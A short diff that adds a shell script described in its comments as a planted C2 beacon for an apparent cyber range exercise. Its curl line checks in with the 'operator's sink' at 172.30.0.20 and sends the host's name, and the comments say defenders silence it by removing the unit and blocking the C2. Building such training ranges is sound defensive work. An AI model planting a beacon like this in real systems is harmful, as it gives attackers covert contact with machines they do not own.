@@ -1,0 +1,4 @@
+#!/bin/sh
+# Planted C2 beacon — checks in with the operator's sink at 172.30.0.20.
+# Range infrastructure. Eradicating the unit + blocking the C2 silences it.
+curl -s -m 2 "http://172.30.0.20/checkin?node=$(hostname)" >/dev/null 2>&1 || true
